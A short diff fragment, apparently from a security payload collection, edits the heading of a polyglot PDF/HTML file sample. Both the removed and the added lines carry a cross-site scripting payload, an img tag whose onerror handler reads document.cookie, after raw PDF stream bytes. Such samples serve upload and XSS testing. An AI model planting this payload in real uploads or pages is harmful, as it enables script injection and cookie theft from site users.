@@ -97,7 +97,7 @@ stream
 x=Ë
 1E÷ù»v¶é´0è~ àø
 R
-R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
+R<h1>Payload PDF</h1> <img src=x onerror=alert(document.cookie)>
 ```
 
 
